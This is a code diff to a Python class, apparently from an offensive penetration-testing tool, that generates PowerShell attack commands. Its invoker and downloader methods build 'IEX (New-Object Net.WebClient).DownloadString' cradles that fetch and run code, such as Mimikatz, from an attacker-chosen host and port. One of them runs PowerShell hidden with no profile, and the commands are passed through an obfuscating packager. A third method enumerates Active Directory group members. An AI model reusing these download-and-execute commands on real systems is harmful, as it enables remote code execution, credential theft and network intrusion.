@@ -91,21 +91,21 @@ class Obfiscator:
 
     def invoker(self):
         # Invoke Mimikatz Directly
-        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+        text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
         self.command = self.packager(text)
-        self.unprotected_command = text
+        self.unprotected_command = 'powershell "' + text +'"'
 
     def downloader(self):
         # Download String Directly
         text = "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://%s:%s/'))" % (str(self.src_ip), str(self.src_port))
         self.command = self.packager(text)
-        self.unprotected_command = text
+        self.unprotected_command = 'powershell "' + text +'"'
 
     def group_members(self):
         # Group Membership
         text = "Get-ADGroupMember -identity %s -Recursive | Get-ADUser -Property DisplayName | Select Name,ObjectClass,DisplayName" % (str(self.group))
         self.command = self.packager(text)
-        self.unprotected_command = text
+        self.unprotected_command = 'powershell "' + text +'"'
 
 def get_interfaces():
     interfaces = netifaces.interfaces()
